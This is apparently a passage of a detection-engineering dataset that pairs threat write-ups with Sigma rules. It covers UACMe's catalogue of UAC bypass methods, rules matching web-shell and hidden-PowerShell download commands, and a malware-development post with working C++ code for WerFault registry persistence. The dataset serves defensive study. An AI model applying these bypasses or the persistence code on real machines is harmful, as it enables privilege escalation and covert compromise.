ucmStandardAutoElevation\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH2 (10558)\n     - **How**: Side effect of OOBE redesign\n   - **Code status**: removed starting from v3.5.0 🚜\n\n4. **Author**: Jon Ericson, WinNT/Gootkit, mzH\n   - **Type**: AppCompat\n   - **Method**: RedirectEXE Shim\n   - **Target(s)**: \\system32\\cliconfg.exe\n   - **Component(s)**: -\n   - **Implementation**: ucmShimRedirectEXE\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TP (> 9600)\n     - **How**: Sdbinst.exe autoelevation removed, KB3045645/KB3048097 for rest Windows versions\n   - **Code status**: removed starting from v3.5.0 🚜\n\n5. **Author**: WinNT/Simda\n   - **Type**: Elevated COM interface\n   - **Method**: ISecurityEditor\n   - **Target(s)**: HKLM registry keys\n   - **Component(s)**: -\n   - **Implementation**: ucmSimdaTurnOffUac\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: ISecurityEditor interface method changed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n6. **Author**: Win32/Carberp\n   - **Type**: Dll Hijack\n   - **Method**: WUSA\n   - **Target(s)**: \\ehome\\mcx2prov.exe, \\system32\\migwiz\\migwiz.exe\n   - **Component(s)**: WdsCore.dll, CryptBase.dll, CryptSP.dll\n   - **Implementation**: ucmWusaMethod\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: WUSA /extract option removed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n7. **Author**: Win32/Carberp derivative\n   - **Type**: Dll Hijack\n   - **Method**: WUSA\n   - **Target(s)**: \\system32\\cliconfg.exe\n   - **Component(s)**: ntwdblib.dll\n   - **Implementation**: ucmWusaMethod\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: WUSA /extract option removed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n8. **Author**: Leo Davidson derivative by Win32/Tilon\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n   - **Component(s)**: Actionqueue.dll\n   - **Implementation**: ucmStandardAutoElevation\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 8.1 (9600)\n     - **How**: sysprep.exe hardened LoadFrom manifest\n   - **Code status**: removed starting from v3.5.0 🚜\n\n9. **Author**: Leo Davidson, WinNT/Simda, Win32/Carberp derivative\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation, ISecurityEditor, WUSA\n   - **Target(s)**: IFEO registry keys, \\system32\\cliconfg.exe\n   - **Component(s)**: Attacker defined Application Verifier Dll\n   - **Implementation**: ucmAvrfMethod\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: WUSA /extract option removed, ISecurityEditor interface method changed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n10. **Author**: WinNT/Pitou, Win32/Carberp derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation, WUSA\n    - **Target(s)**: \\system32\\{New}or{Existing}\\{autoelevated}.exe, e.g. winsat.exe\n    - **Component(s)**: Attacker defined dll, e.g. PowProf.dll, DevObj.dll\n    - **Implementation**: ucmWinSATMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 TH2 (10548)\n      - **How**: AppInfo elevated application path control hardening\n    - **Code status**: removed starting from v3.5.0 🚜\n\n11. **Author**: Jon Ericson, WinNT/Gootkit, mzH\n    - **Type**: AppCompat\n    - **Method**: Shim Memory Patch\n    - **Target(s)**: \\system32\\iscsicli.exe\n    - **Component(s)**: Attacker prepared shellcode\n    - **Implementation**: ucmShimPatch\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 8.1 (9600)\n      - **How**: Sdbinst.exe autoelevation removed, KB3045645/KB3048097 for rest Windows versions\n    - **Code status**: removed starting from v3.5.0 🚜\n\n12. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n    - **Component(s)**: dbgcore.dll\n    - **Implementation**: ucmStandardAutoElevation\n    - **Works from**: Windows 10 TH1 (10240)\n    - **Fixed in**: Windows 10 TH2 (10565)\n      - **How**: sysprep.exe manifest updated\n    - **Code status**: removed starting from v3.5.0 🚜\n\n13. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\mmc.exe EventVwr.msc\n    - **Component(s)**: elsext.dll\n    - **Implementation**: ucmMMCMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14316)\n      - **How**: Missing dependency removed\n    - **Code status**: removed starting from v3.5.0 🚜\n\n14. **Author**: Leo Davidson, WinNT/Sirefef derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system\\credwiz.exe, \\system32\\wbem\\oobe.exe\n    - **Component(s)**: netutils.dll\n    - **Implementation**: ucmSirefefMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 TH2 (10548)\n      - **How**: AppInfo elevated application path control hardening\n    - **Code status**: removed starting from v3.5.0 🚜\n\n15. **Author**: Leo Davidson, Win32/Carberp derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\cliconfg.exe\n    - **Component(s)**: ntwdblib.dll\n    - **Implementation**: ucmGenericAutoelevation\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14316)\n      - **How**: Cliconfg.exe autoelevation removed\n    - **Code status**: removed starting from v3.5.0 🚜\n\n16. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\GWX\\GWXUXWorker.exe, \\system32\\inetsrv\\inetmgr.exe\n    - **Component(s)**: SLC.dll\n    - **Implementation**: ucmGWX\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14316)\n      - **How**: AppInfo elevated application path control and inetmgr executable hardening\n    - **Code status**: removed starting from v3.5.0 🚜\n\n17. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack (Import forwarding)\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n    - **Component(s)**: unbcl.dll\n    - **Implementation**: ucmStandardAutoElevation2\n    - **Works from**: Windows 8.1 (9600)\n    - **Fixed in**: Windows 10 RS1 (14371)\n      - **How**: sysprep.exe manifest updated\n    - **Code status**: removed starting from v3.5.0 🚜\n\n18. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack (Manifest)\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\taskhost.exe, \\system32\\tzsync.exe (any ms exe without manifest)\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmAutoElevateManifest\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14371)\n      - **How**: Manifest parsing logic reviewed\n    - **Code status**: removed starting from v3.5.0 🚜\n\n19. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\inetsrv\\inetmgr.exe\n    - **Component(s)**: MsCoree.dll\n    - **Implementation**: ucmInetMgrMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14376)\n      - **How**: inetmgr.exe executable manifest hardening, MitigationPolicy->ProcessImageLoadPolicy->PreferSystem32Images\n    - **Code status**: removed starting from v3.5.0 🚜\n\n20. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\mmc.exe, Rsop.msc\n    - **Component(s)**: WbemComn.dll\n    - **Implementation**: ucmMMCMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS3 (16232)\n      - **How**: Target requires wbemcomn.dll to be signed by MS\n    - **Code status**: removed starting from v3.5.0 🚜\n\n21. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\inetsrv\\inetmgr.exe\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmCOMHandlersMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 19H1 (18362)\n      - **How**: Side effect of Windows changes\n    - **Code status**: removed starting from v3.5.0 🚜\n\n22. **Author**: Oddvar Moe\n    - **Type**: Elevated COM interface\n    - **Method**: ICMLuaUtil\n    - **Target(s)**: Attacker defined\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmCMLuaUtilShellExecMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: unfixed 🙈\n      - **How**: -\n    - **Code status**: added in v2.8.3\n\n23. **Author**: BreakingMalware and Enigma0x3\n    - **Type**: Elevated COM interface\n    - **Method**: IFwCplLua\n    - **Target(s)**: Attacker defined\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmFwCplLuaMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS4 (17134)\n      - **How**: Shell API update\n    - **Code status**: removed starting from v3.5.0 🚜\n\n#### Warning\n\n- This tool shows ONLY popular UAC bypass method used by malware, and re-implement some of them in a different way improving original concepts. There are different, not yet known to the general public, methods. Be aware of this;\n- This tool is not intended for AV tests and not tested to work in aggressive AV environment, if you still plan to use it with installed bloatware AV soft - use it at your own risk;\n- Some AV may flag this tool as HackTool, MSE/WinDefender constantly marks it as malware, nope;\n- If you run this program on real computer remember to remove all program leftovers after usage, for more info about files it drops to system folders see source code;\n- Most of methods created for x64, with no x86-32 support in mind. I don't see any sense in supporting 32 bit versions of Windows or wow64, however with small tweaks most of them will run under wow64 as well.\n\nIf you wondering why this still exists and working - here is the explanation - an official Microsoft WHITEFLAG (including totally incompetent statements as bonus) link.\n\n#### Windows 10 support and testing policy\n\n- UACMe tested only with LSTB/LTSC variants (1607/1809) and Last RTM-1 versions, e.g. if current version is 2004 it will be tested on 2004 (19041) and previous version 1909 (18363);\n- Insider builds are not supported as methods may be fixed there.\n\n#### Protection\n\n- Account without administrative privileges.\n\n#### Malware usage\n\n- We do not take any responsibility for this tool usage in the malicious purposes. It is free, open-source and provided AS-IS for everyone.\n\n#### Other usage\n\n- Currently used as \"signature\" by \"THOR APT\" scanner (handmade pattern matching fraudware from Germany). We do not take any responsibility for this tool usage in the fraudware;\n- The repository link and it contents are the only genuine source for UACMe code. We have nothing to do with external links to this project, mentions anywhere as well as modifications (forks);\n- In July 2016 so-called \"security company\" Cymmetria released report about script-kiddie malware bundle called \"Patchwork\" and false flagged it as APT. They stated it was using \"UACME method\", which in fact is just slightly and unprofessionally modified injector dll from UACMe v1.9 and was using Carberp/Pitou hybrid method in malware self-implemented way. We do not take any responsibility for UACMe usage in the dubious advertising campaigns from third party \"security companies\".\n\n#### Build\n\n- UACMe comes with full source code, written in C;\n- In order to build from source you need Microsoft Visual Studio 2019 and later versions.\n\n#### Compiled Binaries\n\n- They are not provided since 2.8.9 and will never be provided in future. The reasons (and why you too should not provide them to the general public):\n  - If you look at this project in a nutshell it is a HackTool, despite initial goal to be a demonstrator. Of course several AV's detects it as HackTool (MS WD for example), however most of VirusTotal patients detects it as generic \"malware\". Which is of course incorrect, however unfortunately some lazy malware writers blindly copy-paste code to their crapware (or even simple use this tool directly) thus some AV created signatures based on project code parts;\n  - By giving compiled binaries to everyone you make life of script-kiddies much easier because having need to compile from source works as perfect barrier for exceptionally dumb script-kiddies and \"button-clickers\";\n  - Having compiled binaries in the repository will ultimately lead to flagging this repository pages as malicious (due to above reasons) by various content filters (SmartScreen, Google Safe Browsing etc).\n- This decision is a final and won't be changed.\n\n#### Instructions\n\n- Select Platform ToolSet first for project in solution you want to build (Project->Properties->General):\n  - v142 for Visual Studio 2019;\n  - v143 for Visual Studio 2022.\n- For v140 and above set Target Platform Version (Project->Properties->General):\n  - If v140 then select 8.1 (Note that Windows 8.1 SDK must be installed);\n  - If v141 and above then select 10.\n- The following SDK are required for building the binaries:\n  - Windows 8.1 or Windows 10 SDK (tested with 19041 version)\n  - NET Framework SDK (tested with 4.8 version)\n- To build working binary:\n  - Compile payload units\n  - Compile Naka module\n  - Encrypt all payload units using Naka module\n  - Generate secret blobs for these units using Naka module\n  - Move compiled units and secret blobs to the Akagi\\Bin directory\n  - Rebuild Akagi\n\n#### References\n\n- Windows 7 UAC whitelist, link\n- Malicious Application Compatibility Shims, link\n- Junfeng Zhang from WinSxS dev team blog, link\n- Beyond good ol' Run key, series of articles, link\n- KernelMode.Info UACMe thread, link\n- Command Injection/Elevation - Environment Variables Revisited, link\n- \"Fileless\" UAC Bypass Using eventvwr.exe and Registry Hijacking, link\n- Bypassing UAC on Windows 10 using Disk Cleanup, link\n- Using IARPUninstallStringLauncher COM interface to bypass UAC, link\n- Bypassing UAC using App Paths, link\n- \"Fileless\" UAC Bypass using sdclt.exe, link\n- UAC Bypass or story about three escalations, link\n- Exploiting Environment Variables in Scheduled Tasks for UAC Bypass, link\n- First entry: Welcome and fileless UAC bypass, link\n- Reading Your Way Around UAC in 3 parts:\n  1. link\n  2. link\n  3. link\n- Research on CMSTP.exe, link\n- UAC bypass via elevated .NET applications, link\n- UAC Bypass by Mocking Trusted Directories, link\n- Yet another sdclt UAC bypass, link\n- UAC Bypass via SystemPropertiesAdvanced.exe and DLL Hijacking, link\n- Accessing Access Tokens for UIAccess, link\n- Fileless UAC Bypass in Windows Store Binary, link\n- Calling Local Windows RPC Servers from .NET, link\n- Microsoft Windows 10 UAC bypass local privilege escalation exploit, link\n- UACMe 3.5, WD and the ways of mitigation, link\n- UAC bypasses from COMAutoApprovalList, link\n- Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses, link\n- MSDT DLL Hijack UAC bypass, link\n- UAC bypass through .Net Deserialization vulnerability in eventvwr.exe, link\n- Advanced Windows Task Scheduler Playbook - Part.2 from COM to UAC bypass and get SYSTEM directly, link\n- Bypassing UAC with SSPI Datagram Contexts, link\n- Mitigate some Exploits for Windows’® UAC, link",
    "sigma_rule": {
      "title": "UAC Bypass WSReset",
      "id": "89a9a0e0-f61a-42e5-8957-b1479565a658",
      "status": "test",
      "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wsreset.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset_integrity_level.yml",
    "id": "623"
  },
  {
    "url": "https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/",
    "markdown": "",
    "sigma_rule": {
      "title": "Detect Virtualbox Driver Installation OR Starting Of VMs",
      "id": "bab049ca-7471-4828-9024-38279a4c04da",
      "status": "test",
      "description": "Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.",
      "references": [
        "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/",
        "https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/"
      ],
      "author": "Janantha Marasinghe",
      "date": "2020-09-26",
      "modified": "2022-07-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.006",
        "attack.t1564"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains": [
            "VBoxRT.dll,RTR3Init",
            "VBoxC.dll",
            "VBoxDrv.sys"
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            "startvm",
            "controlvm"
          ]
        },
        "condition": "1 of selection_*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "This may have false positives on hosts where Virtualbox is legitimately being used for operations"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_virtualbox_execution.yml",
    "id": "630"
  },
  {
    "url": "https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script",
      "id": "7aa4e81a-a65c-4e10-9f81-b200eb229d7d",
      "related": [
        {
          "id": "236d8e89-ed95-4789-a982-36f4643738ba",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state",
      "references": [
        "https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/",
        "https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-14",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\VMwareToolBoxCmd.exe"
          },
          {
            "OriginalFileName": "toolbox-cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " script ",
            " set "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_vmware_toolbox_cmd_persistence.yml",
    "id": "631"
  },
  {
    "url": "https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script",
      "id": "7aa4e81a-a65c-4e10-9f81-b200eb229d7d",
      "related": [
        {
          "id": "236d8e89-ed95-4789-a982-36f4643738ba",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state",
      "references": [
        "https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/",
        "https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-14",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\VMwareToolBoxCmd.exe"
          },
          {
            "OriginalFileName": "toolbox-cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " script ",
            " set "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_vmware_toolbox_cmd_persistence.yml",
    "id": "632"
  },
  {
    "url": "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Webshell Detection With Command Line Keywords",
      "id": "bed2a484-9348-4143-8a8a-b801c979301c",
      "status": "test",
      "description": "Detects certain command line parameters often used during reconnaissance activity via web shells",
      "references": [
        "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html",
        "https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/",
        "https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, Anton Kutepov, oscd.community, Chad Hudson, Matt Anderson",
      "date": "2017-01-01",
      "modified": "2024-12-14",
      "tags": [
        "attack.persistence",
        "attack.discovery",
        "attack.t1505.003",
        "attack.t1018",
        "attack.t1033",
        "attack.t1087"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_webserver_image": {
          "ParentImage|endswith": [
            "\\w3wp.exe",
            "\\php-cgi.exe",
            "\\nginx.exe",
            "\\httpd.exe",
            "\\caddy.exe",
            "\\ws_tomcatservice.exe"
          ]
        },
        "selection_webserver_characteristics_tomcat1": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "ParentImage|contains": [
            "-tomcat-",
            "\\tomcat"
          ]
        },
        "selection_webserver_characteristics_tomcat2": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "CommandLine|contains": [
            "catalina.jar",
            "CATALINA_HOME"
          ]
        },
        "selection_susp_net_utility": {
          "OriginalFileName": [
            "net.exe",
            "net1.exe"
          ],
          "CommandLine|contains": [
            " user ",
            " use ",
            " group "
          ]
        },
        "selection_susp_ping_utility": {
          "OriginalFileName": "ping.exe",
          "CommandLine|contains": " -n "
        },
        "selection_susp_change_dir": {
          "CommandLine|contains": [
            "&cd&echo",
            "cd /d "
          ]
        },
        "selection_susp_wmic_utility": {
          "OriginalFileName": "wmic.exe",
          "CommandLine|contains": " /node:"
        },
        "selection_susp_powershell_cli": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -enc ",
            " -EncodedCommand ",
            " -w hidden ",
            " -windowstyle hidden",
            ".WebClient).Download"
          ]
        },
        "selection_susp_misc_discovery_binaries": [
          {
            "Image|endswith": [
              "\\dsquery.exe",
              "\\find.exe",
              "\\findstr.exe",
              "\\ipconfig.exe",
              "\\netstat.exe",
              "\\nslookup.exe",
              "\\pathping.exe",
              "\\quser.exe",
              "\\schtasks.exe",
              "\\systeminfo.exe",
              "\\tasklist.exe",
              "\\tracert.exe",
              "\\ver.exe",
              "\\wevtutil.exe",
              "\\whoami.exe"
            ]
          },
          {
            "OriginalFileName": [
              "dsquery.exe",
              "find.exe",
              "findstr.exe",
              "ipconfig.exe",
              "netstat.exe",
              "nslookup.exe",
              "pathping.exe",
              "quser.exe",
              "schtasks.exe",
              "sysinfo.exe",
              "tasklist.exe",
              "tracert.exe",
              "ver.exe",
              "VSSADMIN.EXE",
              "wevtutil.exe",
              "whoami.exe"
            ]
          }
        ],
        "selection_susp_misc_discovery_commands": {
          "CommandLine|contains": [
            " Test-NetConnection ",
            "dir \\"
          ]
        },
        "condition": "1 of selection_webserver_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_webshell_recon_commands_and_processes.yml",
    "id": "640"
  },
  {
    "url": "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
    "markdown": "# Malware development: persistence - part 18. Windows Error Reporting. Simple C++ example.\n\n---\n\n```image\nAlt: pers\nDescription: The image displays a C++ code snippet for malware persistence via 'WerFault.exe', alongside a Windows PowerShell window showing commands related to registry manipulation. The code includes functions for opening registry keys, setting values, and managing a hijacked application. The PowerShell window shows a query for registry keys linked to Windows Error Reporting, with a dialogue box appearing that responds to the command with 'Meow-meow!'. This technical representation provides insights into malware development techniques.\nTranscription: |\n  cpp\n  // pers.cpp\n  // windows persistence via WerFault.exe\n  // author: (coco)lonc\n  // https://cocolonlc.github.io/malware/2022/11/02/malware-pers-17.html\n  #include <windows.h>\n  #include <string.h>\n  \n  int main(int argc, char* argv[]) {\n      HKEY hkey = NULL;\n      // malicious app\n      const char* exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n      // hijacked app\n      const char* wf = \"WerFault.exe -pr 1\";\n      // set evil app\n      LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,\n          \"SOFTWARE\\\\Microsoft\\\\Windows Error Reporting\\\\Hang\",\n          0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0,\n              REG_SZ, (LPBYTE)exe, strlen(exe) + 1);\n          RegCloseKey(hkey);\n      }\n      // startup\n      res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n          0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"meow\", 0,\n              REG_SZ, (LPBYTE)wf, strlen(wf) + 1);\n          RegCloseKey(hkey);\n      }\n      return 0;\n  }\n  ```\n  \n  ```\n  PS Z:\\2022-11-02-malware-pers-18> .\\pers.exe\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hang\"\n  ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\n      meow    REG_SZ    C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\n      WerFault.exe -pr 1\n  ```\n  \n  ```\n  =^._.^= Meow-meow!\n```\n\nThis post is based on my own research into one of the more interesting malware persistence tricks: via `WerFault.exe`.\n\n### WerFault.exe\n\nWhile studying the behavior of Windows Error Reporting, I came across an interesting Registry path:\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n```\n\nIf we run command\n\n```\nWerFault.exe -pr <value>\n```\n\nit is read\n\n```\nHKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger=<path_value>\n```\n\nThis command runs `WerFault.exe` in a mode which is called *“reflective debugger”* and it is very interesting. For example, run\n\n```\nWerFault.exe -pr 1\n```\n\nand check it via Sysinternals Process Monitor:\n\n```image\nAlt: pers\nDescription: The image displays a PowerShell window running the command `WerFault.exe -pr 1`, alongside a Sysinternals Process Monitor interface. The Process Monitor filter is set to include entries with the process name 'WerFault.exe'. Various process operations are being logged, and the filter conditions are highlighted, showing an emphasis on monitoring the behavior of the 'WerFault.exe' process during execution. This image is relevant as it illustrates the examination of Windows Error Reporting behavior in the context of malware persistence.\nTranscription: |\n  Process Monitor - Sysinternals. www.sysinternals.com\n  \n  Process Monitor Filter\n  Display entries matching these conditions:\n  Architecture is \n  \n  Column           Relation      Value            Action\n  -------------------------------------------------------\n  Process Name     contains      WerFault.exe     Include\n  Process Name     is            Procmom.exe      Exclude\n  Process Name     is            Procexp.exe      Exclude\n  Process Name     is            Autoruns.exe     Exclude\n  Process Name     is            Procmon64.exe    Exclude\n  Process Name     is            Procexp64.exe    Exclude\n  Operation        begins with   IRP_MJ_          Exclude\n  \n  [OK] [Cancel] [Apply]\n  \n  Showing 210 of 233,202 events (0.090%)\n  Backed by virtual memory\n  \n  C:\\Windows\\system32>\n```\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of the Sysinternals Process Monitor application running on a Windows environment. The Process Monitor displays a list of events related to the execution of 'WerFault.exe' with the command line argument '-pr 1'. Each row represents a different operation performed by the process, including actions like 'Process Start', 'Thread Create', 'Load Image', and various registry access operations. The relevant registry path being accessed is displayed, showing interactions with 'HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger'. The interface includes several details such as time, process name, process ID (PID), operation type, and result of each operation.\nTranscription: |\n  Time        Process Name    PID   Operation       Path\n  7:47:5...   WerFault.exe    88    Process Start   C:\\Windows\\System32\\WerFault.exe\n  7:47:5...   WerFault.exe    88    Thread Create    \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\ntdll.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Segment Heap\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\ResourcePolicies\n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\kernel32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\msvcrt.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\n  7:47:5...   WerFault.exe    88    RegOpenKey      